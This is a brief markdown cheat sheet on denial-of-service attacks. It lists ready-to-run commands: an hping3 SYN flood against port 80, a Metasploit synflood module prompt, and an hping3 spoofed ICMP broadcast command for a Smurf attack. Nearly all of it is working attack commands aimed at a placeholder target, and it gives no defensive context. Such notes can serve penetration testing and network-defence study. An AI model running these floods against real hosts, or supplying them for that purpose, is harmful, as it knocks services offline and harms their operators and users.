# Denial of Service

## SYN Flood

```bash
hping3 -S --flood -p 80 <target>
```
```bash
msf5 auxiliary(dos/tcp/synflood) >
```

## Smurf attack

> Sending a broadcast of ICMP echo packets from a spoofed source to flood it with ICMP replies

```bash
hping3 --icmp --spoof <target> <broadcast_address>
```